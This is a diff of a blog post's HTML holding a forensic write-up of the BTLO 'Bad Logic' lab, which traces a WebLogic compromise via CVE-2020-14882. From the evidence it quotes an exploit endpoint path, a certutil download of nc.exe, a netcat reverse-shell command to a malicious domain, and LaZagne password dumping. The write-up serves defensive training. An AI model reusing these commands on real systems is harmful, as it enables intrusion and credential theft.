@@ -2,24 +2,39 @@
 <html lang="en">
 
 <head>
+    <title>GraymanRe - BTLO Bad Logic</title>
+    <meta name="robots" content="follow, index, max-snippet:-1, max-video-preview:-1, max-image-preview:large" />
+    <meta name="description" content="Writeup for the Bad Logic challenge by Blue Team Labs Online" />
+
     <meta property="og:title" content="GraymanRe - BTLO Bad Logic" />
     <meta property="og:description" content="Blue Team Labs Bad Logic Forensics Challenge Writeup" />
+    <meta property="og:locale" content="en_US" />
+    <meta property="og:type" content="article" />
     <meta property="og:image" content="https://graymanre.github.io/img/btlo_badlogic.webp" />
-    <meta property="og:url" content="https://graymanre.github.io/" />
-    <meta name="description" content="Writeup for the Bad Logic challenge by Blue Team Labs Online"/>
+    <meta property="og:image:secure_url" content="https://graymanre.github.io/img/btlo_badlogic.webp" />
+    <meta property="og:image:width" content="4267" />
+    <meta property="og:image:height" content="2400" />
+    <meta property="og:image:alt" content="btlo badlogic" />
+    <meta property="og:image:type" content="image/webp" />
+    <meta property="og:url" content="https://graymanre.github.io/ctf/btlo_badlogic.html" />
+    <meta property="og:updated_time" content="2025-11-09T15:35:00+00:00" />
+    <meta property="article:published_time" content="2024-03-26T13:00:00+00:00" />
+    <meta property="article:modified_time" content="2025-11-09T15:35:00+00:00" />
+    <meta property="article:section" content="ctf" />
+
     <meta name="twitter:card" content="summary_large_image" />
     <meta name="twitter:image" content="https://graymanre.github.io/img/btlo_badlogic.webp" />
     <meta name="twitter:creator" content="@grayman_re" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="GraymanRE" />
 
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
 
-    <title>GraymanRe - BTLO Bad Logic</title>
+    <link rel="canonical" href="https://graymanre.github.io/ctf/btlo_badlogic.html">
+    <link rel="alternate" type="application/rss+xml" title="GraymanRe Feed" href="https://graymanre.github.io/feed.xml">
 
-    <link rel="canonical" href="https://graymanre.github.io/">
-    <link rel="alternate" type="application/rss+xml" title="GraymanRe" href="/feed.xml">
-    <link rel="icon" type="image/x-icon" href="/img/favicon.ico">
     <!-- Fonts -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700;900&display=swap" rel="stylesheet">
 
@@ -65,7 +80,8 @@
                                 <i class="ion ion-md-close"></i>
                             </div>
                             <label for="js-search-input" class="screen-reader-text">Search for Post</label>
-                            <input type="text" id="js-search-input" class="search__text" autocomplete="off" placeholder="Type to search...">
+                            <input type="text" id="js-search-input" class="search__text" autocomplete="off"
+                                placeholder="Type to search...">
                         </div>
                     </div>
                 </div>
@@ -85,7 +101,8 @@
                     <div class="col col-8 col-t-12">
                         <div class="post-head__box">
                             <div class="post__meta">
-                                <span id="time"></span> min read <time class="post__date" datetime="2024-03-26T15:00:00+02:00">26 March 2024</time>
+                                <span id="time"></span> min read <time class="post__date"
+                                    datetime="2024-03-26T15:00:00+02:00">26 March 2024</time>
                             </div>
                             <h2 class="post__title">Blue Team Labs Online - Bad Logic</h2>
                             <div class="post__bottom">
@@ -114,8 +131,10 @@
                 <div class="post__content">
                     <h2 id="post__content__title">Introduction</h2>
                     <p>
-                        Today we will be walking through one of the Blue Team Labs Online Investigations: Bad Logic. The Investigation is
-                        rated as <b>"Hard"</b> and will earn you <b>100 points</b>. To earn full points, you have to answer 10 questions in regard to
+                        Today we will be walking through one of the Blue Team Labs Online Investigations: Bad Logic. The
+                        Investigation is
+                        rated as <b>"Hard"</b> and will earn you <b>100 points</b>. To earn full points, you have to
+                        answer 10 questions in regard to
                         the following scenario:
                     </p>
                     <pre><code class="language-markdown">During standard servicing & patching of our server the sysadmins were denied access to 
@@ -128,66 +147,119 @@ be of assistance. A full review of the compromised application may also be in or
                     <pre><code class="language-markdown">Q1) Which application did the threat actor exploit, what port does this run on and which
     CVE did the threat actor utilise? (10 points)</code></pre><br>
                     <p>
-                        I started this investigation of by looking through the MD-Artefacts folder and identifying which files were to our disposal for investigation. Within the <span id="inline-code">Module_Options/LiveResponse</span>
-                        folder, several helpful system information files were located. One of these files, <span id="inline-code">ipconfig</span> details the ethernet adapter configuration. From this file, we
-                        learn that the system's IP address is <span id="inline-code">172.31.4.99</span>. Additionally, based on the Windows Services in <span id="inline-code">NetSystemInfo</span> and the
-                        open connections/listening services in <span id="inline-code">network_connections</span>, we see that nginx is run on port 80, and an application called <span id="inline-code">node</span> on port 8000.
+                        I started this investigation of by looking through the MD-Artefacts folder and identifying which
+                        files were to our disposal for investigation. Within the <span
+                            id="inline-code">Module_Options/LiveResponse</span>
+                        folder, several helpful system information files were located. One of these files, <span
+                            id="inline-code">ipconfig</span> details the ethernet adapter configuration. From this file,
+                        we
+                        learn that the system's IP address is <span id="inline-code">172.31.4.99</span>. Additionally,
+                        based on the Windows Services in <span id="inline-code">NetSystemInfo</span> and the
+                        open connections/listening services in <span id="inline-code">network_connections</span>, we see
+                        that nginx is run on port 80, and an application called <span id="inline-code">node</span> on
+                        port 8000.
                         <br><br>
-                        Using this information, we open the pcap file <span id="inline-code">md_capture</span> in Wireshark and apply the filter <span id="inline-code">tcp.port == 80 and ip.dst == 172.31.4.99 and http.chat and protocol not OCSP</span>.
-                        I added in the part regarding OSCP as the capture contained numerous packets and although it has some known vulnerabilities, I am not aware of any that lead to full system compromises.
-                        After combing through the logs, I do not find any signs of an attack, although I see several requests which correlate which known NMAP behaviour. NMAP is a network scanning tool which
-                        can be used to identify open ports and scan for vulnerabilities in services running on these ports.
+                        Using this information, we open the pcap file <span id="inline-code">md_capture</span> in
+                        Wireshark and apply the filter <span id="inline-code">tcp.port == 80 and ip.dst == 172.31.4.99
+                            and http.chat and protocol not OCSP</span>.
+                        I added in the part regarding OSCP as the capture contained numerous packets and although it has
+                        some known vulnerabilities, I am not aware of any that lead to full system compromises.
+                        After combing through the logs, I do not find any signs of an attack, although I see several
+                        requests which correlate which known NMAP behaviour. NMAP is a network scanning tool which
+                        can be used to identify open ports and scan for vulnerabilities in services running on these
+                        ports.
                         <br><br>
-                        Since there was no obvious sign of intrusion on port 80, I decided to focus on the IP address running what I suspected to be the NMAP scan: <span id="inline-code">178.62.72.123</span>.
-                        After applying that IP as our filter, together with the IP address of the Windows victim machine we previously identified, we can clearly identify that an port scan (likely using NMAP),
-                        was run against our victim system, before the traffic then starts focussing on one specific port: 7001. If we add that port to our filter, we become aware of multiple requests that were
+                        Since there was no obvious sign of intrusion on port 80, I decided to focus on the IP address
+                        running what I suspected to be the NMAP scan: <span id="inline-code">178.62.72.123</span>.
+                        After applying that IP as our filter, together with the IP address of the Windows victim machine
+                        we previously identified, we can clearly identify that an port scan (likely using NMAP),
+                        was run against our victim system, before the traffic then starts focussing on one specific
+                        port: 7001. If we add that port to our filter, we become aware of multiple requests that were
                         performed against the HTTP service running on that port.
                         <br><br>
-                        If we analyze these requests, we see several that are directed at <span id="inline-code">/console/images/../console.portal</span>. If we perform a quick google search, we discover
-                        that this endpoint is used for the CVE-2020-14882. This CVE is assigned to a critical vulnerability in the Oracle WebLogic Server and allows for remote code execution. If we closer
-                        analyze the request, we see that the threat actor executes the command <span id="inline-code">ping.exe advertyzing.co.uk</span> within their exploit.
+                        If we analyze these requests, we see several that are directed at <span
+                            id="inline-code">/console/images/../console.portal</span>. If we perform a quick google
+                        search, we discover
+                        that this endpoint is used for the CVE-2020-14882. This CVE is assigned to a critical
+                        vulnerability in the Oracle WebLogic Server and allows for remote code execution. If we closer
+                        analyze the request, we see that the threat actor executes the command <span
+                            id="inline-code">ping.exe advertyzing.co.uk</span> within their exploit.
                         <br><br>
-                        Based on this information, we can conclude that the application is <span id="inline-code">weblogic</span> which runs on port <span id="inline-code">7001</span> and is exploited
+                        Based on this information, we can conclude that the application is <span
+                            id="inline-code">weblogic</span> which runs on port <span id="inline-code">7001</span> and
+                        is exploited
                         using <span id="inline-code">CVE-2020-14882</span>.
                         <br>
                         <img class="lazy" data-src="/img/btlo_badlogic_q1.png" alt="q1_answer">
                     </p>
                     <h2 id="post__content__title">Malicious Domain</h2>
-                    <pre><code class="language-markdown">Q2) What is the malicious domain used by the threat actor? (10 points)</code></pre><br>
+                    <pre><code class="language-markdown">Q2) What is the malicious domain used by the threat actor? (10 points)</code></pre>
+                    <br>
                     <p>
-                        Whilst finding the answers to question 1, we identfied that the threat actor performed multiple requests against the Oracle WebLogic Server running on port 7001. If we closely
-                        analyze these results, we find that by exploiting CVE-2020-14882 the threat actor initially tries to ping the server <span id="inline-code">advertyzing.co.uk</span> and subsequently
-                        attempts to download <span id="inline-code">nc.exe</span>. This binary is known for setting up network connections and has both legitimate and illegitimate uses. By focussing on the
-                        download request, we observe the threat actor trying to obtain the binary from the same domain: <span id="inline-code">advertyzing.co.uk</span>. Therefore we can conclude that it
+                        Whilst finding the answers to question 1, we identfied that the threat actor performed multiple
+                        requests against the Oracle WebLogic Server running on port 7001. If we closely
+                        analyze these results, we find that by exploiting CVE-2020-14882 the threat actor initially
+                        tries to ping the server <span id="inline-code">advertyzing.co.uk</span> and subsequently
+                        attempts to download <span id="inline-code">nc.exe</span>. This binary is known for setting up
+                        network connections and has both legitimate and illegitimate uses. By focussing on the
+                        download request, we observe the threat actor trying to obtain the binary from the same domain:
+                        <span id="inline-code">advertyzing.co.uk</span>. Therefore we can conclude that it
                         is highly likely that the malicious domain is <span id="inline-code">advertyzing.co.uk</span>.
                         <br>
                         <img class="lazy" data-src="/img/btlo_badlogic_q1.png" alt="q2_answer">
                     </p>
                     <h2 id="post__content__title">Threat Actor IP IOCs</h2>
-                    <pre><code class="language-markdown">Q3) Confirm the two IP addresses utilized by the threat actor (10 points)</code></pre><br>
+                    <pre><code class="language-markdown">Q3) Confirm the two IP addresses utilized by the threat actor (10 points)</code></pre>
+                    <br>
                     <p>
-                        We know already that the threat actor used IP address <span id="inline-code">178.62.72.123</span> to exploit CVE-2020-14882. We are additionally searching for a second IP
-                        address utilized by the threat actor. We start our hunt by assuming that the threat actor also used this IP to connect to our server, and additionally tried to connect to
-                        the Oracle WebLogic Server as well over HTTP. Thus, we apply a filter for these specific attributes: <span id="inline-code">ip.addr == 172.31.4.99 and tcp.port == 7001 and !ip.addr == 178.62.72.123</span>.
-                        We consciously filter out the already identified IP address to ensure we don't clog the output. We are left with two unique IP addresses that also connect to port 7001. If we
-                        analyze both, we identify that the connection to <span id="inline-code">82.16.6.12</span> occured before the CVE exploit attempt, and seeminly valid credentials were used to access the
-                        WebLogic Server. It is unlikely that a threat actor would first logon with valid credentials to then try to exploit the server. The second IP address <span id="inline-code">95.181.232.7</span>
-                        on the other hand only performs two GET requests that seem innocuous. If we widen our scope, and search for all network connections by both IP addresses,
+                        We know already that the threat actor used IP address <span
+                            id="inline-code">178.62.72.123</span> to exploit CVE-2020-14882. We are additionally
+                        searching for a second IP
+                        address utilized by the threat actor. We start our hunt by assuming that the threat actor also
+                        used this IP to connect to our server, and additionally tried to connect to
+                        the Oracle WebLogic Server as well over HTTP. Thus, we apply a filter for these specific
+                        attributes: <span id="inline-code">ip.addr == 172.31.4.99 and tcp.port == 7001 and !ip.addr ==
+                            178.62.72.123</span>.
+                        We consciously filter out the already identified IP address to ensure we don't clog the output.
+                        We are left with two unique IP addresses that also connect to port 7001. If we
+                        analyze both, we identify that the connection to <span id="inline-code">82.16.6.12</span>
+                        occured before the CVE exploit attempt, and seeminly valid credentials were used to access the
+                        WebLogic Server. It is unlikely that a threat actor would first logon with valid credentials to
+                        then try to exploit the server. The second IP address <span id="inline-code">95.181.232.7</span>
+                        on the other hand only performs two GET requests that seem innocuous. If we widen our scope, and
+                        search for all network connections by both IP addresses,
                         <span id="inline-code">178.62.72.123,95.181.232.7</span>
                     </p>
                     <h2 id="post__content__title">Obtaining Persistence</h2>
                     <pre><code class="language-markdown">Q4) The threat actor has attempted an unusual way of persisting by editing a key file. 
     Which configuration file have they altered? (10 points)</code></pre><br>
                     <p>
-                        By now, we have analyzed all exploit requests that were send to the victim. One of these events contained the command <span id="inline-code">'C$\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\nc.exe advertyzing.co.uk 443 -e </span>.
-                        It appears that the <span id="inline-code">nc.exe</span> was downloaded into the Oracle folder. If we browse to that location we don't see the binary anymore. However, it contained
-                        both a bash and shell script named <span id="inline-code">startWebLogic</span> which piqued my interest. They seem to execute similarly named scripts from inside the <span id="inline-code">bin</span>
-                        folder. Browsing into the <span id="inline-code">bin</span> folder, we see four files named <span id="inline-code">startWebLogic</span>. By analyzing these files, we identify that the threat actor
-                        edited <span id="inline-code">startWebLogic.cmd</span> to run <span id="inline-code">startWebLogic.bat</span> which subsequently calls <span id="inline-code">startWebLogic.exe</span>.
-                        Personally, that's quite a lot of referals which could have been developed more efficiently. After reviewing <a href="https://help.adobe.com/en_US/livecycle/11.0/AdminHelp/WS92d06802c76abadb-5145d5d12905ce07e7-7c8f.2.html">Adobe's documentation</a>
-                        it appeared that on Windows systems, normally only <span id="inline-code">startWebLogic.cmd</span> is needed. There is no reference at all around the Windows Batch nor the Windows executable file.
-                        After obtaining the SHA256 hash and submitting it to VirusTotal, we discover that VirusTotal classifies this binary to be <span id="inline-code">nc.exe</span> and closer review of the
-                        <span id="inline-code">startWebLogic.bat</span> makes it seem like the commands one would normally pass to netcat. Therefore, we can conclude that the threat actor modified key file:
+                        By now, we have analyzed all exploit requests that were send to the victim. One of these events
+                        contained the command <span
+                            id="inline-code">'C$\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\nc.exe
+                            advertyzing.co.uk 443 -e </span>.
+                        It appears that the <span id="inline-code">nc.exe</span> was downloaded into the Oracle folder.
+                        If we browse to that location we don't see the binary anymore. However, it contained
+                        both a bash and shell script named <span id="inline-code">startWebLogic</span> which piqued my
+                        interest. They seem to execute similarly named scripts from inside the <span
+                            id="inline-code">bin</span>
+                        folder. Browsing into the <span id="inline-code">bin</span> folder, we see four files named
+                        <span id="inline-code">startWebLogic</span>. By analyzing these files, we identify that the
+                        threat actor
+                        edited <span id="inline-code">startWebLogic.cmd</span> to run <span
+                            id="inline-code">startWebLogic.bat</span> which subsequently calls <span
+                            id="inline-code">startWebLogic.exe</span>.
+                        Personally, that's quite a lot of referals which could have been developed more efficiently.
+                        After reviewing <a
+                            href="https://help.adobe.com/en_US/livecycle/11.0/AdminHelp/WS92d06802c76abadb-5145d5d12905ce07e7-7c8f.2.html">Adobe's
+                            documentation</a>
+                        it appeared that on Windows systems, normally only <span
+                            id="inline-code">startWebLogic.cmd</span> is needed. There is no reference at all around the
+                        Windows Batch nor the Windows executable file.
+                        After obtaining the SHA256 hash and submitting it to VirusTotal, we discover that VirusTotal
+                        classifies this binary to be <span id="inline-code">nc.exe</span> and closer review of the
+                        <span id="inline-code">startWebLogic.bat</span> makes it seem like the commands one would
+                        normally pass to netcat. Therefore, we can conclude that the threat actor modified key file:
                         <span id="inline-code">startweblogic.cmd</span>.
                         <br>
                         <img class="lazy" data-src="/img/btlo_badlogic_q4_1.png" alt="q4_answer">
@@ -199,9 +271,12 @@ be of assistance. A full review of the compromised application may also be in or
     (10 points)</code></pre><br>
                 </div>
                 <p>
-                    If we refer back to question 2 we identified that the threat actor used the command execution vulnerability in Oracle to execute the <span id="inline-code">ping</span> command.
-                    However, we have identified that the threat actor performed multiple requests to the vulnerable endpoint. If we analyze the other commands that were executed, we discover that
-                    the threat actor used <span id="inline-code">certutil.exe</span> to download the <span id="inline-code">nc.exe</span> binary.
+                    If we refer back to question 2 we identified that the threat actor used the command execution
+                    vulnerability in Oracle to execute the <span id="inline-code">ping</span> command.
+                    However, we have identified that the threat actor performed multiple requests to the vulnerable
+                    endpoint. If we analyze the other commands that were executed, we discover that
+                    the threat actor used <span id="inline-code">certutil.exe</span> to download the <span
+                        id="inline-code">nc.exe</span> binary.
                     <br>
                     <img class="lazy" data-src="/img/btlo_badlogic_q5.png" alt="q5_answer">
                 </p>
@@ -209,21 +284,32 @@ be of assistance. A full review of the compromised application may also be in or
                 <pre><code class="language-markdown">Q6) What was the name of the malicious file they downloaded using this 
     Windows executable? (10 points)</code></pre><br>
                 <p>
-                    By discovering the answer for question 2 and expanding upon our analysis by answer question 5, we also immediately discovered the answer for question 6. The threat actor downloaded
-                    the "malicious" file <span id="inline-code">nc.exe</span>. I put malicious inside of quotation marks since as I discussed in question 2, nc.exe is used both for legitimate and
+                    By discovering the answer for question 2 and expanding upon our analysis by answer question 5, we
+                    also immediately discovered the answer for question 6. The threat actor downloaded
+                    the "malicious" file <span id="inline-code">nc.exe</span>. I put malicious inside of quotation marks
+                    since as I discussed in question 2, nc.exe is used both for legitimate and
                     illegitimate purposes.
                     <br>
                     <img class="lazy" data-src="/img/btlo_badlogic_q5.png" alt="q6_answer">
                 </p>
                 <h2 id="post__content__title">Threat Actor Email IOC</h2>
-                <pre><code class="language-markdown">Q7) What email address is associated with the threat actor? (10 points)</code></pre><br>
+                <pre><code class="language-markdown">Q7) What email address is associated with the threat actor? (10 points)</code></pre>
+                <br>
                 <p>
-                    By now, I decided that the Wireshark Capture probably had served it's full purpose and it was time to dive into the memory dump to see if we could obtain more information. The size
-                    of the memory dump (8.25GB) had me already a bit worried since large sizes always take a lot of time to load. After trying several commands, it appeared that volatility just would
-                    not work for this memory dump. This is where I decided to peruse the <span id="inline-code">README.txt</span> left on the Desktop. There, we discover that the "security team", did
-                    performed a least-effort approach and was already hinting to the memory dump being unusable. As I had no starting points to gain an answer to this question I left it for later.
-                    I came back to this question after answering question 10, after browsing to the PowerShell log, since I discovered that the cryptominer of question 8 had created a user configuration
-                    data folder as well. When I browsed into that folder, I had a look at, amongst others, the <span id="inline-code">config.json</span> file and discovered the email address: <span id="inline-code">bzuyxpdpphthhbvxpz@niwghx.com</span>.
+                    By now, I decided that the Wireshark Capture probably had served it's full purpose and it was time
+                    to dive into the memory dump to see if we could obtain more information. The size
+                    of the memory dump (8.25GB) had me already a bit worried since large sizes always take a lot of time
+                    to load. After trying several commands, it appeared that volatility just would
+                    not work for this memory dump. This is where I decided to peruse the <span
+                        id="inline-code">README.txt</span> left on the Desktop. There, we discover that the "security
+                    team", did
+                    performed a least-effort approach and was already hinting to the memory dump being unusable. As I
+                    had no starting points to gain an answer to this question I left it for later.
+                    I came back to this question after answering question 10, after browsing to the PowerShell log,
+                    since I discovered that the cryptominer of question 8 had created a user configuration
+                    data folder as well. When I browsed into that folder, I had a look at, amongst others, the <span
+                        id="inline-code">config.json</span> file and discovered the email address: <span
+                        id="inline-code">bzuyxpdpphthhbvxpz@niwghx.com</span>.
                     <br>
                     <img class="lazy" data-src="/img/btlo_badlogic_q7.png" alt="q7_answer">
                 </p>
@@ -231,33 +317,48 @@ be of assistance. A full review of the compromised application may also be in or
                 <pre><code class="language-markdown">Q8) The threat actor has used an off-the-shelf cryptominer, what is the name of the 
     executable? (10 points)</code></pre><br>
                 <p>
-                    Refer back to question 1, where we identified multiple system information files in our artifacts folder. One of these files contained a CSV list of scheduled tasks that were
-                    present on the system. Immediatly on the very first few lines, we identify two scheduled tasks called <span id="inline-code">KryptexElevation</span> and
-                    <span id="inline-code">KryptexElevationFromStartup</span>. The application is stored in <span id="inline-code">C:\Users\Administrator\AppData\Local\Program\kryptex-app\</span>
-                    and has a comment of <span id="inline-code">[...] Kryptex uses admin privileges to configure system for better mining performance</span> Additionally, a quick Google search for
-                    Kryptex reveals it's <a href="https://www.kryptex.com/en/">website</a> promoting the tool as a cryptocurrency miner.
+                    Refer back to question 1, where we identified multiple system information files in our artifacts
+                    folder. One of these files contained a CSV list of scheduled tasks that were
+                    present on the system. Immediatly on the very first few lines, we identify two scheduled tasks
+                    called <span id="inline-code">KryptexElevation</span> and
+                    <span id="inline-code">KryptexElevationFromStartup</span>. The application is stored in <span
+                        id="inline-code">C:\Users\Administrator\AppData\Local\Program\kryptex-app\</span>
+                    and has a comment of <span id="inline-code">[...] Kryptex uses admin privileges to configure system
+                        for better mining performance</span> Additionally, a quick Google search for
+                    Kryptex reveals it's <a href="https://www.kryptex.com/en/">website</a> promoting the tool as a
+                    cryptocurrency miner.
                     <br>
                     <img class="lazy" data-src="/img/btlo_badlogic_q8.png" alt="q8_answer">
                 </p>
                 <h2 id="post__content__title">Password Dumping Tool</h2>
-                <pre><code class="language-markdown">Q9) What is the name of the password dumping tool used by the threat actor? (10 points)</code></pre><br>
+                <pre><code class="language-markdown">Q9) What is the name of the password dumping tool used by the threat actor? (10 points)</code></pre>
+                <br>
                 <p>
-                    I based myself on the assumption that this question was framed in such a way that it is likely that this tool was executed using either cmd or powershell. By default, PowerShell
-                    command logging is stored in the <a href="https://medium.com/@reallydontaskmetosignin/the-single-most-important-powershell-command-that-you-will-ever-learn-407daab0a18d">
+                    I based myself on the assumption that this question was framed in such a way that it is likely that
+                    this tool was executed using either cmd or powershell. By default, PowerShell
+                    command logging is stored in the <a
+                        href="https://medium.com/@reallydontaskmetosignin/the-single-most-important-powershell-command-that-you-will-ever-learn-407daab0a18d">
                         Roaming
                         folder of individual users
-                    </a>. We know that the threat actor obtained Administrator privileges thanks to the CVE they exploited. As such, we start our hunt in
-                    <span id="inline-code">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span>.
-                    In the PowerShell command history, we identify multiple commands executing the <span id="inline-code">lazange.exe</span> binary. One of these commands redirects the output of the
-                    tool to the file <span id="inline-code">password_extract.txt</span>. Once again, a quick Google search helps us out. LaZagne is available on
-                    <a href="https://github.com/AlessandroZ/LaZagne">Github</a> and is desribed as an open source application used to retrieve lots of passwords stored on a local computer.
+                    </a>. We know that the threat actor obtained Administrator privileges thanks to the CVE they
+                    exploited. As such, we start our hunt in
+                    <span
+                        id="inline-code">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span>.
+                    In the PowerShell command history, we identify multiple commands executing the <span
+                        id="inline-code">lazange.exe</span> binary. One of these commands redirects the output of the
+                    tool to the file <span id="inline-code">password_extract.txt</span>. Once again, a quick Google
+                    search helps us out. LaZagne is available on
+                    <a href="https://github.com/AlessandroZ/LaZagne">Github</a> and is desribed as an open source
+                    application used to retrieve lots of passwords stored on a local computer.
                     <br>
                     <img class="lazy" data-src="/img/btlo_badlogic_q9.png" alt="q9_answer">
                 </p>
                 <h2 id="post__content__title">Data Exfiltration</h2>
-                <pre><code class="language-markdown">Q10) What is the name of the text file the TA echo'ed out to? (10 points)</code></pre><br>
+                <pre><code class="language-markdown">Q10) What is the name of the text file the TA echo'ed out to? (10 points)</code></pre>
+                <br>
                 <p>
-                    To answer this question, we can refer back to our findings for question 9, where we identified that the output of lazange was redirected (echo'ed) to the file:
+                    To answer this question, we can refer back to our findings for question 9, where we identified that
+                    the output of lazange was redirected (echo'ed) to the file:
                     <span id="inline-code">password_extract.txt</span>
                     <br>
                     <img class="lazy" data-src="/img/btlo_badlogic_q9.png" alt="q10_answer">
@@ -301,4 +402,5 @@ be of assistance. A full review of the compromised application may also be in or
     <script src="/js/common.js"></script>
     <script src="/js/readingtime.js"></script>
 </body>
+
 </html>
